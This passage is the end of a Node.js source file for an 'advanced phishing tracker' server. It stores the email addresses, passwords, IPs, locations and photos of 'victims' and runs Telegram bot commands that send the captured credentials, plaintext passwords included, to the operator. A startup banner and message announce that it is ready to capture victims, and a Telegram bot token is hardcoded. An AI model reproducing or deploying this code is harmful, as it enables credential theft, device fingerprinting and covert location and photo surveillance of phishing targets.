        total: victims.size,
        victims: victimsList,
        stats: {
            withLocation: victimsList.filter(v => v.location === 'Yes').length,
            withPhoto: victimsList.filter(v => v.photo === 'Yes').length,
            uniqueCountries: [...new Set(victimsList.map(v => v.country))].length
        }
    });
});

// Generate victim ID
function generateVictimId(req) {
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || '';
    const timestamp = Date.now();
    
    return crypto
        .createHash('sha256')
        .update(ip + userAgent + timestamp)
        .digest('hex')
        .substring(0, 12);
}

// Bot commands handler
if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
    bot.onText(/\/start/, (msg) => {
        bot.sendMessage(msg.chat.id, `
🕵️ *Phishing Tracker Bot* 🕵️

*Commands:*
/victims - List all captured victims
/stats - Show tracking statistics
/latest - Show latest victim details
/help - Show this help message

*Automatic alerts* will be sent when new victims are captured.
        `, { parse_mode: 'Markdown' });
    });
    
    bot.onText(/\/victims/, (msg) => {
        const victimsList = Array.from(victims.values())
            .slice(-10) // Last 10 victims
            .map((v, i) => 
                `${i+1}. ${v.credentials.email} (${v.ip}) - ${moment(v.timestamp).fromNow()}`
            )
            .join('\n');
        
        bot.sendMessage(msg.chat.id, 
            `*Last 10 Victims:*\n\n${victimsList || 'No victims yet'}`,
            { parse_mode: 'Markdown' }
        );
    });
    
    bot.onText(/\/stats/, (msg) => {
        const stats = {
            total: victims.size,
            today: Array.from(victims.values()).filter(v => 
                moment(v.timestamp).isSame(moment(), 'day')
            ).length,
            withLocation: Array.from(victims.values()).filter(v => v.location).length,
            withPhoto: Array.from(victims.values()).filter(v => v.photo).length
        };
        
        bot.sendMessage(msg.chat.id, 
            `*Tracking Statistics:*\n\n` +
            `👥 Total Victims: ${stats.total}\n` +
            `📅 Today: ${stats.today}\n` +
            `📍 With Location: ${stats.withLocation}\n` +
            `📸 With Photos: ${stats.withPhoto}`,
            { parse_mode: 'Markdown' }
        );
    });
    
    bot.onText(/\/latest/, (msg) => {
        const latest = Array.from(victims.values()).pop();
        if (latest) {
            const summary = `
*Latest Victim Summary:*

👤 Email: ${latest.credentials.email}
🔑 Password: \`${latest.credentials.password}\`
🌐 IP: ${latest.ip}
📍 Location: ${latest.location ? 'Yes' : 'No'}
📸 Photo: ${latest.photo ? 'Yes' : 'No'}
⏰ Time: ${moment(latest.timestamp).format('YYYY-MM-DD HH:mm:ss')}
            `;
            bot.sendMessage(msg.chat.id, summary, { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(msg.chat.id, 'No victims captured yet.');
        }
    });
}

// Start server
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════╗
║       🕵️ ADVANCED PHISHING TRACKER ONLINE       ║
╠══════════════════════════════════════════════════════╣
║                                                      ║
║  🔗 URL: http://localhost:${PORT}                    ║
║  📊 Port: ${PORT}                                    ║
║  🤖 Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Connected' : '❌ Not Configured'} ║
║  💾 Storage: In-memory database                     ║
║                                                      ║
║  📁 Logs saved to: ./logs/                          ║
║  📸 Photos saved: Yes                               ║
║  📍 Location tracking: Yes                          ║
║  🔍 Device fingerprinting: Yes                      ║
║                                                      ║
╚══════════════════════════════════════════════════════╝
    `);
    
    // Send startup message to Telegram
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
        bot.sendMessage(TELEGRAM_CHAT_ID, 
            `✅ *Phishing Tracker Started*\n\n` +
            `🌐 Server: ${DOMAIN}\n` +
            `🕐 Time: ${moment().format('YYYY-MM-DD HH:mm:ss')}\n` +
            `📊 Ready to capture victims.`,
            { parse_mode: 'Markdown' }
        );
    }
});

// Package.json dependencies
/*
{
  "name": "advanced-phishing-tracker",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "node-telegram-bot-api": "^0.61.0",
    "geoip-lite": "^1.4.7",
    "moment": "^2.29.4"
  }
}
*/
